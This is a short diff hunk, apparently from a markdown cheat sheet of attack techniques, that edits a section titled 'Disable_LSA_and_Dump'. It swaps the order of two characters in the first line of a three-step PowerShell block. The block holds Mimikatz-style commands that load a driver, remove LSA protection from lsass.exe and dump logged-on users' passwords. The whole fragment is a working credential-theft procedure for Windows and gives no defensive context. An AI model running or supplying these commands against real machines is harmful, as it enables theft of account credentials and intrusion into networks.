@@ -1832,7 +1832,7 @@ tryme
 
 ## Disable_LSA_and_Dump
 ```powershell
-1. +!
+1. !+
 2. !processprotect /process:lsass.exe /remove
 3. sekurlsa::logonpasswords
 ```
